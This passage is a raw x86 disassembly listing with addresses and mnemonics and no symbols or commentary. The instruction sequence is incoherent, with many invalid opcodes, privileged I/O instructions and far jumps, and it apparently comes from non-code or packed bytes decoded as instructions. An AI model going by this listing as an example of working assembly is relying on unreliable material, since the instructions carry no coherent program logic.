  41c9a9:	adc    eax,0x403ddc91
  41c9ae:	push   esp
  41c9af:	(bad)  
  41c9b0:	adc    BYTE PTR [ebx+0x436ad185],al
  41c9b6:	aaa    
  41c9b7:	or     eax,0xb3703275
  41c9bc:	mov    cl,0x4f
  41c9be:	cmp    edi,DWORD PTR [esi+0x494f9932]
  41c9c4:	push   ebx
  41c9c5:	or     BYTE PTR [eax-0x1a],0xab
  41c9c9:	cwde   
  41c9ca:	mov    ds:0xd8901784,eax
  41c9cf:	jmp    0x41c9a3
  41c9d1:	push   ebx
  41c9d2:	mov    ds:0xc437138f,al
  41c9d7:	pop    edx
  41c9d8:	es mov ch,0xac
  41c9db:	sbb    al,0x9e
  41c9dd:	dec    eax
  41c9de:	dec    esp
  41c9df:	sbb    esi,ecx
  41c9e1:	fldcw  WORD PTR [ebx+0x14]
  41c9e4:	mov    ecx,0xcb0e4cc
  41c9e9:	popa   
  41c9ea:	dec    esp
  41c9eb:	push   cs
  41c9ec:	adc    DWORD PTR [esi-0x263d1113],esi
  41c9f2:	jne    0x41c97a
  41c9f4:	add    ebp,edi
  41c9f6:	test   BYTE PTR [esi],ah
  41c9f8:	adc    esi,ebx
  41c9fa:	icebp  
  41c9fb:	fcomp  QWORD PTR [ebx-0x37e4b832]
  41ca01:	sbb    ch,BYTE PTR [edx+0x7d7ffc6d]
  41ca07:	inc    ebx
  41ca08:	add    ebp,ecx
  41ca0a:	xchg   ebx,eax
  41ca0b:	les    ebx,FWORD PTR [esi-0x3e8d1cfa]
  41ca11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca12:	sub    al,ah
  41ca14:	test   al,0x66
  41ca16:	fucom  st(7)
  41ca18:	lods   al,BYTE PTR ds:[esi]
  41ca19:	xchg   ebp,eax
  41ca1a:	xor    ebp,ecx
  41ca1c:	leave  
  41ca1d:	mov    ah,0xf6
  41ca1f:	fstp   DWORD PTR [eax-0xf1147a6]
  41ca25:	int3   
  41ca26:	jmp    0x41ca5f
  41ca28:	outs   dx,BYTE PTR fs:[esi]
  41ca2a:	mov    ah,0x3c
  41ca2c:	pop    esi
  41ca2d:	aaa    
  41ca2e:	ins    BYTE PTR es:[edi],dx
  41ca2f:	pop    edi
  41ca30:	ins    BYTE PTR es:[edi],dx
  41ca31:	xchg   ecx,eax
  41ca32:	pop    ebp
  41ca33:	(bad)  
  41ca34:	leave  
  41ca35:	mov    bl,0x5e
  41ca37:	call   0x75d8:0xc3b5d8f9
  41ca3e:	int3   
  41ca3f:	dec    ecx
  41ca40:	or     ebx,DWORD PTR [eax-0x70cedd0]
  41ca46:	inc    edi
  41ca48:	jbe    0x41ca81
  41ca4a:	call   0x8666:0xbe2f357
  41ca51:	ffree  st(5)
  41ca53:	cld    
  41ca54:	retf   
  41ca55:	sub    BYTE PTR [eax+0x3caec051],bh
  41ca5b:	or     BYTE PTR [ebx+0x25f4e205],0x48
  41ca62:	cdq    
  41ca63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca64:	in     al,dx
  41ca65:	sub    DWORD PTR [edx-0x1e],ecx
  41ca68:	mov    esp,DWORD PTR [edi-0x4d67d54a]
  41ca6e:	mov    ch,BYTE PTR [ebx-0x5ff3092e]
  41ca74:	imul   edi,DWORD PTR [ebx+ebx*2-0x78],0x76b076bc
  41ca7c:	loop   0x41ca0c
  41ca7e:	adc    al,0x53
  41ca80:	(bad)  
  41ca81:	xor    ch,BYTE PTR [ebx+0xe3e7feb]
  41ca87:	jecxz  0x41ca5f
  41ca89:	mov    DWORD PTR [ecx],esp
  41ca8b:	mov    esi,0x2eae2880
  41ca90:	cli    
  41ca91:	fdiv   QWORD PTR [ebx-0x4]
  41ca94:	jle    0x41ca50
  41ca96:	ror    DWORD PTR [edi-0xa],1
  41ca99:	sti    
  41ca9a:	icebp  
  41ca9b:	mov    al,ds:0xa2985f28
  41caa0:	frstor [ebp+0x53c073da]
  41caa6:	mov    DWORD PTR [edx],ecx
  41caa8:	jbe    0x41cab3
  41caaa:	xor    eax,0xc4311786
  41caaf:	fiadd  WORD PTR [ecx+0x49]
  41cab2:	dec    esi
  41cab3:	call   0x5ec5:0x1c30ae71
  41caba:	adc    ebp,edx
  41cabc:	xor    al,0x33
  41cabe:	cmp    al,0x59
  41cac0:	inc    eax
  41cac1:	cwde   
  41cac2:	hlt    
  41cac3:	adc    ebp,ebp
  41cac5:	mov    edi,0x3332aeee
  41caca:	jp     0x41ca51
  41cacc:	aam    0x4a
  41cace:	add    al,0xdb
  41cad0:	push   esp
  41cad1:	aaa    
  41cad2:	or     BYTE PTR [eax],bl
  41cad4:	jg     0x41ca66
  41cad6:	stos   DWORD PTR es:[edi],eax
  41cad7:	lds    ebp,FWORD PTR [ebp-0x7e3c1839]
  41cadd:	xchg   BYTE PTR [ebx+0x72],dh
  41cae0:	ins    DWORD PTR es:[edi],dx
  41cae1:	gs mov ah,0x39
  41cae4:	out    dx,eax
  41cae5:	push   eax
  41cae6:	pusha  
  41cae7:	clc    
  41cae8:	mov    esi,0x32ecf45d
  41caed:	(bad)  
  41caee:	xchg   esi,eax
  41caef:	xor    DWORD PTR [ebx+0x7d],ebx
  41caf2:	cmp    DWORD PTR [esi-0x303aa6a9],ebp
  41caf8:	data16 mov ch,0x37
  41cafb:	cmp    al,BYTE PTR [edi+0x3e]
  41cafe:	mov    al,ds:0x6c8f198c
  41cb03:	jl     0x41cad3
  41cb05:	cmp    edi,ebx
  41cb07:	dec    ecx
  41cb08:	inc    DWORD PTR [eax+0x9]
  41cb0b:	pop    edx
  41cb0c:	(bad)  
  41cb0d:	out    0x68,eax
  41cb0f:	sub    al,0x2e
  41cb11:	add    ecx,DWORD PTR [ebx]
  41cb13:	sbb    DWORD PTR [ebp+0x72],0xfe11e34b
  41cb1a:	gs data16 aam 0xbc
  41cb1e:	sbb    dh,BYTE PTR [edi-0x5c]
  41cb21:	push   eax
  41cb22:	aaa    
  41cb23:	or     al,BYTE PTR [edx+0x2883b707]
  41cb29:	fcmovne st,st(3)
  41cb2b:	std    
  41cb2c:	mov    BYTE PTR [ecx+0x6698719d],dh
  41cb32:	cmc    
  41cb33:	pop    esi
  41cb34:	pop    ebx
  41cb35:	in     eax,0x25
  41cb37:	xchg   ebp,eax
  41cb38:	sbb    edx,DWORD PTR [edx]
  41cb3a:	or     BYTE PTR [ecx],ch
  41cb3c:	push   ss
  41cb3d:	stos   DWORD PTR es:[edi],eax
  41cb3e:	add    BYTE PTR [ebp-0x2c64e093],al
  41cb44:	push   ecx
  41cb45:	cmp    ebp,DWORD PTR [ebp-0x7a]
  41cb48:	and    bl,BYTE PTR [esi-0x1de8c2c3]
  41cb4e:	mov    ah,0xe5
  41cb50:	push   esp
  41cb51:	add    DWORD PTR [esi+0x204cb810],edi
  41cb57:	loopne 0x41cb06
  41cb59:	cmc    
  41cb5a:	dec    ecx
  41cb5b:	out    0x9,al
  41cb5d:	jle    0x41cb4e
  41cb5f:	out    0xce,al
  41cb61:	pusha  
  41cb62:	jno    0x41cb59
  41cb64:	xchg   ebx,eax
  41cb65:	mov    ds,WORD PTR [ebx+esi*2+0x59]
  41cb69:	test   BYTE PTR [esi],0x62
  41cb6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb6d:	call   DWORD PTR [edi+0x10becf54]
  41cb73:	cli    
  41cb74:	cwde   
  41cb75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb76:	cmp    eax,0x4d362a4c
  41cb7b:	sahf   
  41cb7c:	popf   
  41cb7d:	enter  0x806,0xc9
  41cb81:	add    DWORD PTR [ecx+0x32],ebp
  41cb84:	fimul  WORD PTR [esp+eax*4+0x5c7b9982]
  41cb8b:	inc    eax
  41cb8c:	inc    ecx
  41cb8d:	adc    al,0xc5
  41cb8f:	xchg   edi,eax
  41cb90:	stc    
  41cb91:	xor    bl,BYTE PTR [eax]
  41cb93:	xchg   esi,eax
  41cb94:	dec    edx
  41cb95:	pop    ecx
  41cb96:	dec    edx
  41cb97:	pop    esi
  41cb98:	(bad)  
  41cb9a:	xchg   ebx,eax
  41cb9b:	xchg   ebx,edi
  41cb9d:	mov    BYTE PTR [esi-0x64],dl
  41cba0:	pop    eax
  41cba1:	and    DWORD PTR [edx+0x3],edx
  41cba4:	fcomp  DWORD PTR [ebx]
  41cba6:	ins    BYTE PTR es:[edi],dx
  41cba7:	std    
  41cba8:	enter  0x686f,0xd2
  41cbac:	iret   
  41cbad:	dec    esp
  41cbae:	xchg   esi,eax
  41cbaf:	lock scas al,BYTE PTR es:[edi]
  41cbb1:	sahf   
  41cbb2:	or     BYTE PTR [edx],al
  41cbb4:	(bad)  
  41cbb5:	mov    cl,0xd5
  41cbb7:	jbe    0x41cb4c
  41cbb9:	jmp    0xa9008639
  41cbbe:	adc    eax,0xe68f5af9
  41cbc3:	cmp    esi,DWORD PTR [edi-0x2d1fe323]
  41cbc9:	nop
  41cbca:	outs   dx,DWORD PTR ds:[esi]
  41cbcb:	je     0x41cb88
  41cbcd:	and    DWORD PTR [ecx-0x69],0x33
  41cbd1:	mov    ebx,0x3c3d086e
  41cbd6:	pop    ss
  41cbd7:	arpl   WORD PTR [edi],ax
  41cbd9:	cwde   
  41cbda:	mov    ecx,0x836b88f8
  41cbdf:	sbb    esp,DWORD PTR [edi-0x46b9d3e7]
  41cbe5:	popf   
  41cbe6:	ins    BYTE PTR es:[edi],dx
  41cbe7:	clc    
  41cbe8:	mov    edi,0xfc8a0a5
  41cbed:	arpl   bp,bx
  41cbef:	and    bh,ch
  41cbf1:	jb     0x41cbc4
  41cbf3:	daa    
  41cbf4:	pushf  
  41cbf5:	pop    es
  41cbf6:	stc    
  41cbf7:	repz iret 
  41cbf9:	aas    
  41cbfa:	sahf   
  41cbfb:	fisub  DWORD PTR [edi+edx*2+0x70b5f263]
  41cc02:	xchg   edx,eax
  41cc03:	leave  
  41cc04:	inc    esi
  41cc05:	jge    0x41cbff
  41cc07:	(bad)  
  41cc08:	push   esp
  41cc09:	mov    ecx,0x546c9dbb
  41cc0e:	les    ecx,FWORD PTR [esi]
  41cc10:	aam    0x83
  41cc12:	cmp    eax,DWORD PTR [edi+ebx*1-0x51]
  41cc16:	xor    dl,BYTE PTR [esi]
  41cc18:	jl     0x41cbb6
  41cc1a:	ss in  eax,0x31
  41cc1d:	ret    
  41cc1e:	xchg   edx,eax
  41cc1f:	and    al,0x57
  41cc21:	in     al,dx
  41cc22:	sbb    BYTE PTR [ebx+ecx*8],0xaf
  41cc26:	push   ecx
  41cc27:	sub    DWORD PTR [edi-0x2868b636],esp
  41cc2d:	cld    
  41cc2e:	jecxz  0x41cc81
  41cc30:	jne    0x41cc7e
  41cc32:	inc    esp
  41cc33:	cmp    eax,0xb68e19df
  41cc38:	xor    al,0x96
  41cc3a:	fisubr WORD PTR [edx+0x4b8210e5]
  41cc40:	call   0xfbd45081
  41cc45:	ins    DWORD PTR es:[di],dx
  41cc47:	lods   eax,DWORD PTR ds:[esi]
  41cc48:	pop    ebx
  41cc49:	add    eax,0x9388296f
  41cc4e:	data16 mov ah,0x45
  41cc51:	adc    eax,0xf09c0435
  41cc56:	sbb    eax,0xa08ed0b0
  41cc5b:	sti    
  41cc5c:	adc    BYTE PTR [ebx-0xd],0x23
  41cc60:	(bad)
  41cc63:	and    al,0x96
  41cc65:	push   0x50b74bb7
  41cc6a:	or     BYTE PTR [eax+0x5],dh
  41cc6d:	pop    ebp
  41cc6e:	inc    edi
  41cc6f:	adc    BYTE PTR [edi+ecx*2-0x3e],dl
  41cc73:	xchg   ebp,esp
  41cc75:	add    bh,bl
  41cc77:	xor    al,0xb3
  41cc79:	clc    
  41cc7a:	das    
  41cc7b:	and    DWORD PTR [edi+0x2d7595ad],esp
  41cc81:	jmp    0x41ccf1
  41cc83:	ds sar dl,cl
  41cc86:	sbb    BYTE PTR gs:[ebx+ecx*4-0x3a],dl
  41cc8b:	mov    al,0x0
  41cc8d:	mov    dh,0x53
  41cc8f:	mov    BYTE PTR [eax],bh
  41cc91:	sbb    edx,edx
  41cc93:	retf   0x385d
  41cc96:	sub    DWORD PTR [edx],edi
  41cc98:	pop    eax
  41cc99:	ret    0x92e3
  41cc9c:	scas   al,BYTE PTR es:[edi]
  41cc9d:	outs   dx,BYTE PTR ds:[esi]
  41cc9e:	and    al,0x19
  41cca0:	sahf   
  41cca1:	xor    al,BYTE PTR [edx-0x71f0cc27]
  41cca7:	mov    dl,0x92
  41cca9:	add    BYTE PTR [ebp+0x328a0974],al
  41ccaf:	pusha  
  41ccb0:	inc    eax
  41ccb1:	je     0x41cc70
  41ccb3:	out    0x8d,eax
  41ccb5:	add    al,0xe5
  41ccb7:	fwait
  41ccb8:	cmc    
  41ccb9:	ror    DWORD PTR [ecx+edx*8+0x3294efd3],0xeb
  41ccc1:	xor    BYTE PTR [ebp+0x6f],al
  41ccc4:	mov    dl,0xa1
  41ccc6:	push   esi
  41ccc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccc8:	xchg   ecx,eax
  41ccc9:	lods   eax,DWORD PTR ds:[esi]
  41ccca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cccb:	inc    eax
  41cccc:	in     al,0xbc
  41ccce:	aam    0xa8
  41ccd0:	idiv   eax
  41ccd2:	cmp    ecx,DWORD PTR es:[ebx+0x7c]
  41ccd6:	das    
  41ccd7:	daa    
  41ccd8:	xor    DWORD PTR [edx],edx
  41ccda:	mov    edx,0x8f18a6ee
  41ccdf:	outs   dx,BYTE PTR ds:[esi]
  41cce0:	out    0x6c,al
  41cce2:	out    dx,al
  41cce3:	push   cs
  41cce4:	pop    es
  41cce5:	(bad)  
  41cce6:	out    0xe8,al
  41cce8:	sbb    ebp,edx
  41ccea:	ins    BYTE PTR es:[edi],dx
  41cceb:	pop    ss
  41ccec:	lock sbb esp,edx
  41ccef:	push   0xfd85d1e2
  41ccf4:	sub    DWORD PTR [edi-0x67],edi
  41ccf7:	dec    ebp
  41ccf8:	loop   0x41ccf3
  41ccfa:	rcr    DWORD PTR ds:0xc9b2bead,1
  41cd00:	call   0x2c15d0f
  41cd05:	cmp    eax,0x51d9834c
  41cd0a:	cdq    
  41cd0b:	xchg   ebp,eax
  41cd0c:	cdq    
  41cd0d:	(bad)  
  41cd0e:	test   eax,0x71c535c1
  41cd13:	inc    ebx
  41cd14:	out    0xf9,eax
  41cd16:	sbb    al,BYTE PTR [ebx-0x529765dd]
  41cd1c:	jbe    0x41ccc4
  41cd1e:	adc    al,0x63
  41cd20:	jmp    0xe76e28e9
  41cd25:	lahf   
  41cd26:	jne    0x41cd0e
  41cd28:	mov    dl,0x89
  41cd2a:	pop    es
  41cd2b:	lods   eax,DWORD PTR ds:[esi]
  41cd2c:	sbb    bl,bl
  41cd2e:	jbe    0x41ccff
  41cd30:	rcl    ebp,0xc4
  41cd33:	dec    ecx
  41cd34:	sub    dl,BYTE PTR [ecx+0x7]
  41cd37:	inc    edi
  41cd38:	test   DWORD PTR [eax],edi
  41cd3a:	ret    0x4915
  41cd3d:	lock jmp 0x41cd4e
  41cd40:	push   0xffffffbf
  41cd42:	imul   edi,DWORD PTR [ecx],0xffffff9e
  41cd45:	call   0x7620:0xdeec3d20
  41cd4c:	sti    
  41cd4d:	test   DWORD PTR [ebx],ebp
  41cd4f:	dec    esi
  41cd50:	ins    DWORD PTR es:[edi],dx
  41cd51:	inc    DWORD PTR [edi+0x79c70c19]
  41cd57:	sub    ah,BYTE PTR [edi-0x346c7b13]
  41cd5d:	mov    ah,0x74
  41cd5f:	mov    bh,0x48
  41cd61:	aaa    
  41cd62:	add    ah,0xa6
  41cd65:	outs   dx,DWORD PTR ds:[esi]
  41cd66:	mov    edx,0x8676bc2b
  41cd6b:	sbb    eax,DWORD PTR [ecx+0x52]
  41cd6e:	xor    edx,DWORD PTR [eax+0x16]
  41cd71:	and    al,0x38
  41cd73:	test   BYTE PTR [esp+esi*4+0x1c4ae4c9],0x8c
  41cd7b:	ret    0x8980
  41cd7e:	popa   
  41cd7f:	out    dx,al
  41cd80:	inc    edi
  41cd81:	push   ds
  41cd82:	fucomip st,st(3)
  41cd84:	sbb    al,dl
  41cd86:	mov    al,ds:0xad76e67e
  41cd8b:	xchg   esi,eax
  41cd8c:	scas   eax,DWORD PTR es:[edi]
  41cd8d:	in     al,0x7e
  41cd8f:	push   ebx
  41cd90:	mov    dh,bh
  41cd92:	add    DWORD PTR [ecx+0x7b37e998],0xbe5e40b2
  41cd9c:	dec    edx
  41cd9d:	add    DWORD PTR [edx-0x6c3ed27c],esp
  41cda3:	jno    0x41cd50
  41cda5:	outs   dx,BYTE PTR ds:[esi]
  41cda6:	in     eax,0xd
  41cda8:	sub    BYTE PTR [eax],ah
  41cdaa:	stos   BYTE PTR es:[di],al
  41cdac:	mov    DWORD PTR [eax+0x39],esp
  41cdaf:	int    0xc9
  41cdb1:	mov    cl,BYTE PTR [esi]
  41cdb3:	mov    ecx,0x6fddc932
  41cdb8:	push   0xffffff99
  41cdba:	js     0x41cd85
  41cdbc:	test   BYTE PTR ss:[esi+esi*8-0x438d4eac],ah
  41cdc4:	sbb    BYTE PTR [edi+0x453ae22b],bh
  41cdca:	add    ebp,0x42
  41cdcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdce:	adc    BYTE PTR [eax-0x480c701],0xc4
  41cdd5:	cld    
  41cdd6:	popf   
  41cdd7:	xor    BYTE PTR [ebx-0x72d15870],dl
  41cddd:	scas   eax,DWORD PTR es:[edi]
  41cdde:	arpl   WORD PTR [eax],bp
  41cde0:	push   cs
  41cde1:	mov    DWORD PTR [ebx+0x4a],esi
  41cde4:	popa   
  41cde5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cde6:	mov    ecx,0x637ff75f
  41cdeb:	jle    0x41cde1
  41cded:	in     al,dx
  41cdee:	inc    esp
  41cdef:	(bad)
  41cdf2:	and    DWORD PTR [esi],0x5b
  41cdf5:	and    ah,BYTE PTR [ebx+0xea7c06d]
  41cdfb:	jg     0x41cdf8
  41cdfd:	loopne 0x41ce28
  41cdff:	loopne 0x41ce60
  41ce01:	mov    ebx,ss
  41ce03:	sub    DWORD PTR [eax+ecx*1+0x8e13588],ebx
  41ce0a:	sub    al,0xd3
  41ce0c:	push   ebx
  41ce0d:	or     ecx,DWORD PTR [ebp+0x79a077bf]
  41ce13:	adc    DWORD PTR [ecx],esp
  41ce15:	inc    DWORD PTR [esi*8-0x44a11f96]
  41ce1c:	cld    
  41ce1d:	les    ebp,FWORD PTR ds:0x704b7cb8
  41ce23:	add    eax,0xbe9199cb
  41ce28:	mov    BYTE PTR [esi-0x15f6f639],bl
  41ce2e:	out    dx,al
  41ce2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce30:	loopne 0x41cdfa
  41ce32:	data16 aam 0xd4
  41ce35:	nop
  41ce36:	fs inc edi
  41ce38:	aad    0x5e
  41ce3a:	pop    ss
  41ce3b:	mov    ebp,0x300f5cca
  41ce40:	push   ebx
  41ce41:	bound  ebp,QWORD PTR [esi+0x3db8b9d7]
  41ce47:	xor    BYTE PTR [edi+0x46f636d8],0xbb
  41ce4e:	(bad)  
  41ce4f:	cmp    DWORD PTR [esi-0x41],edx
  41ce52:	or     DWORD PTR [ebp+edx*2-0x3b98efee],0xfffffff5
  41ce5a:	ins    DWORD PTR es:[edi],dx
  41ce5b:	sbb    esp,DWORD PTR [ebx-0x4f618aa9]
  41ce61:	stc    
  41ce62:	ins    BYTE PTR es:[edi],dx
  41ce63:	aas    
  41ce64:	and    dl,cl
  41ce66:	into   
  41ce67:	jmp    0x25132f49
  41ce6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce6d:	shl    BYTE PTR [ebp-0x30],1
  41ce70:	cld    
  41ce71:	and    bl,BYTE PTR [ebx-0x57]
  41ce74:	lods   eax,DWORD PTR ds:[esi]
  41ce75:	xchg   DWORD PTR [eax],ebp
  41ce77:	push   es
  41ce78:	sahf   
  41ce79:	or     ah,BYTE PTR ss:[ebx+0x321d77fe]
  41ce80:	test   al,0xa1
  41ce82:	pop    eax
  41ce83:	push   ds
  41ce84:	pop    edx
  41ce85:	cli    
  41ce86:	mov    al,BYTE PTR [edx]
  41ce88:	int    0xe6
  41ce8a:	pushf  
  41ce8b:	jecxz  0x41cf07
  41ce8d:	imul   BYTE PTR [edi+0x9ee3fb5]
  41ce93:	and    bl,ah
  41ce95:	cli    
  41ce96:	add    eax,0x70e5fe5f
  41ce9b:	jbe    0x41ced8
  41ce9d:	into   
  41ce9e:	push   0x3fa3924d
  41cea3:	inc    edi
  41cea4:	fdivr  st,st(2)
  41cea6:	gs stos DWORD PTR es:[edi],eax
  41cea8:	repz sar DWORD PTR [edx+0x5a58c250],1
  41ceaf:	imul   ebp,DWORD PTR [ebx-0x78fc9d75],0xffffffcf
  41ceb6:	sbb    eax,0xd8d6b166
  41cebb:	inc    edi
  41cebc:	cs cli 
  41cebe:	add    BYTE PTR [eax-0x15],al
  41cec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cec2:	in     al,0x7c
  41cec4:	dec    esi
  41cec5:	imul   eax,DWORD PTR ds:0x8a63950c,0x76
  41cecc:	leavew 
  41cece:	xchg   esp,eax
  41cecf:	jmp    0xcb32b8e0
  41ced4:	inc    esp
  41ced5:	xor    DWORD PTR [esi+0x1bd3f9a2],ebx
  41cedb:	mov    cl,BYTE PTR [ebp-0x6de08c8b]
  41cee1:	dec    ebp
  41cee2:	pop    eax
  41cee3:	jp     0x41ceae
  41cee5:	and    DWORD PTR [edx+0x3b35e603],ebx
  41ceeb:	bound  edx,QWORD PTR [ecx-0x7c452ff1]
  41cef1:	enter  0x14a0,0x91
  41cef5:	cs cdq 
  41cef7:	loope  0x41cf65
  41cef9:	cmc    
  41cefa:	ret    0xf7d0
  41cefd:	xor    eax,0xe9a10bc5
  41cf02:	or     DWORD PTR ds:0xfec3916,eax
  41cf08:	add    eax,0xb18546ff
  41cf0d:	repnz bound edx,QWORD PTR [ebx+0x58131518]
  41cf14:	jns    0x41cf57
  41cf16:	lahf   
  41cf17:	repnz arpl WORD PTR [ebp-0x71],dx
  41cf1b:	das    
  41cf1c:	hlt    
  41cf1d:	pushf  
  41cf1e:	mov    ebx,0x6142684d
  41cf23:	cmp    al,0x0
  41cf25:	add    eax,0xb61f6b59
  41cf2a:	dec    esp
  41cf2b:	or     ebp,DWORD PTR [edi-0x21]
  41cf2e:	sub    eax,0xe633b920
  41cf33:	aam    0x49
  41cf35:	(bad)  
  41cf36:	popf   
  41cf37:	ds cli 
  41cf39:	nop
  41cf3a:	cwde   
  41cf3b:	inc    edi
  41cf3c:	stos   BYTE PTR es:[edi],al
  41cf3d:	js     0x41cf31
  41cf3f:	call   0x9f3:0x11d77984
  41cf46:	cmp    al,BYTE PTR [ebx]
  41cf48:	mov    dh,0x6a
  41cf4a:	push   cs
  41cf4b:	iret   
  41cf4c:	sbb    DWORD PTR [ecx],ebp
  41cf4e:	bound  eax,QWORD PTR [eax-0x5a]
  41cf51:	in     al,0x4
  41cf53:	dec    edx
  41cf54:	(bad)  
  41cf55:	pop    esp
  41cf56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf57:	xor    al,0xb5
  41cf59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf5a:	dec    eax
  41cf5b:	xchg   edx,eax
  41cf5c:	cmp    BYTE PTR [edi],al
  41cf5e:	mov    ch,0x32
  41cf60:	outs   dx,BYTE PTR ds:[esi]
  41cf61:	data16 ja 0x41cf36
  41cf64:	xor    al,0xec
  41cf66:	mov    eax,0xf0f94ff3
  41cf6b:	dec    esi
  41cf6c:	ror    dl,1
  41cf6e:	xor    BYTE PTR [ebp+ecx*2+0x561cbf66],bh
  41cf75:	add    BYTE PTR [edi],dh
  41cf77:	imul   edx,DWORD PTR [ecx-0xc16a4fe],0xc0886e96
  41cf81:	jb     0x41cf4d
  41cf83:	mov    ebp,0x6a3b2c69
  41cf88:	call   0xda2db8a0
  41cf8d:	mov    ch,0x38
  41cf8f:	fbld   TBYTE PTR [edx+0x36]
  41cf92:	pop    eax
  41cf93:	fsub   QWORD PTR [ebp+0x78b7c2a8]
  41cf99:	or     DWORD PTR [ebp+0x37135ec1],ebp
  41cf9f:	cdq    
  41cfa0:	pop    ds
  41cfa1:	jnp    0x41cf7f
  41cfa3:	push   cs
  41cfa4:	adc    eax,0x93244c1d
  41cfa9:	les    esi,FWORD PTR [ebp-0xbac445b]
  41cfaf:	popf   
  41cfb0:	repnz cwde 
  41cfb2:	xor    dl,BYTE PTR [edi-0x80]
  41cfb5:	leave  
  41cfb6:	call   0xfa94ff80
  41cfbb:	jmp    0x41cfbc
  41cfbd:	gs cmc 
  41cfbf:	(bad)  
  41cfc0:	sub    BYTE PTR [ebx+0x5a8071b],dl
  41cfc6:	loope  0x41cfc5
  41cfc8:	cli    
  41cfc9:	mov    dh,0xc5
  41cfcb:	sbb    DWORD PTR [esi+0x63],esi
  41cfce:	jbe    0x41cf53
  41cfd0:	mov    ebx,0x6be9ea03
  41cfd5:	mov    bl,dh
  41cfd7:	mov    ecx,0x17d5bcfe
  41cfdc:	(bad)  
  41cfdd:	inc    eax
  41cfde:	rcr    DWORD PTR [edx],cl
  41cfe0:	xchg   edx,eax
  41cfe1:	cdq    
  41cfe2:	dec    ebp
  41cfe3:	ja     0x41d023
  41cfe5:	fimul  WORD PTR [ebx-0x5ea083b3]
  41cfeb:	sbb    al,cl
  41cfed:	jnp    0x41d042
  41cfef:	xlat   BYTE PTR ds:[ebx]
  41cff0:	icebp  
  41cff1:	xor    DWORD PTR [ebx+0x3f51e971],0xaaa8264a
  41cffb:	cld    
  41cffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cffd:	push   ss
  41cffe:	ret    0xacbd
  41d001:	adc    al,0x4b
  41d003:	mov    eax,ds:0xb4dd8e67
  41d008:	pushf  
  41d009:	mov    ?,WORD PTR [ecx-0x299a16a6]
  41d00f:	mov    esi,0xb5b9b8e6
  41d014:	push   ds
  41d015:	imul   ebx,DWORD PTR [esi+0xee56024],0x9e8448ca
  41d01f:	mov    BYTE PTR [edx-0x5c],bl
  41d022:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d023:	leave  
  41d024:	xchg   ecx,eax
  41d025:	icebp  
  41d026:	mov    eax,ds:0xeccbe06d
  41d02b:	xor    DWORD PTR [ebp+0x55a88d69],esp
  41d031:	pop    ebp
  41d032:	popf   
  41d033:	arpl   bp,ax
  41d035:	jno    0x41d098
  41d037:	ins    DWORD PTR es:[edi],dx
  41d038:	in     eax,0x62
  41d03a:	mov    edx,0xfb3a4446
  41d03f:	push   ecx
  41d040:	(bad)  
  41d041:	enter  0x845d,0xda
  41d045:	into   
  41d046:	push   ebx
  41d047:	sar    esi,0xb7
  41d04a:	imul   ebp,esi,0x252df77c
  41d050:	std    
  41d051:	inc    esi
  41d052:	mov    ebx,0x2fa02647
  41d057:	sub    al,bl
  41d059:	ret    0xf749
  41d05c:	mov    ebx,0xb4af60df
  41d061:	fwait
  41d062:	or     al,0xed
  41d064:	adc    edi,DWORD PTR [ebx]
  41d066:	icebp  
  41d067:	dec    esi
  41d068:	push   ebx
  41d069:	cs aaa 
  41d06b:	add    DWORD PTR [esp+eax*1],eax
  41d06e:	ins    DWORD PTR es:[edi],dx
  41d06f:	xchg   ebx,ebx
  41d071:	dec    esp
  41d072:	xor    DWORD PTR ds:0x9a5286f9,esi
  41d078:	jb     0x41d06a
  41d07a:	inc    edx
  41d07b:	stos   DWORD PTR es:[edi],eax
  41d07c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d07d:	pop    ebx
  41d07e:	hlt    
  41d07f:	add    BYTE PTR [eax-0x2e],bh
  41d082:	sbb    DWORD PTR [ecx-0x42],edx
  41d085:	in     eax,dx
  41d086:	pop    edi
  41d087:	inc    esi
  41d088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d089:	pop    edi
  41d08a:	lds    esi,FWORD PTR [ebx]
  41d08c:	pop    edx
  41d08d:	mov    bh,dl
  41d08f:	jns    0x41d086
  41d091:	idiv   ch
  41d093:	push   ebp
  41d094:	addr16 dec esi
  41d096:	call   0x32328b2d
  41d09b:	(bad)  [ecx-0x35]
  41d09e:	inc    esi
  41d09f:	bound  edi,QWORD PTR [ecx+0x4c8d5172]
  41d0a5:	xchg   esi,eax
  41d0a6:	xchg   ebp,eax
  41d0a7:	dec    ecx
  41d0a8:	jno    0x41d0af
  41d0aa:	cmp    al,0x39
  41d0ac:	sub    dh,BYTE PTR [ecx-0x31]
  41d0af:	push   cs
  41d0b0:	sbb    edi,DWORD PTR [ecx+0x73]
  41d0b3:	lea    eax,[ebx]
  41d0b5:	ja     0x41d038
  41d0b7:	test   BYTE PTR [eax],cl
  41d0b9:	cs ins DWORD PTR es:[edi],dx
  41d0bb:	mov    DWORD PTR [ebp+0x5fc6e294],0xbeae4d85
  41d0c5:	mov    DWORD PTR [edi+0x17],ebp
  41d0c8:	cs out 0x84,al
  41d0cb:	je     0x41d102
  41d0cd:	mov    al,ds:0x1eb1f130
  41d0d2:	mov    eax,0xdb51cf0b
  41d0d7:	sbb    ebp,DWORD PTR cs:[eax+0x26b9ac7b]
  41d0de:	xor    edx,DWORD PTR [eax+ebp*1-0x32]
  41d0e2:	xchg   ebp,eax
  41d0e3:	pop    esp
  41d0e4:	enter  0x6dce,0xf5
  41d0e8:	retf   
  41d0e9:	pop    edi
  41d0ea:	aaa    
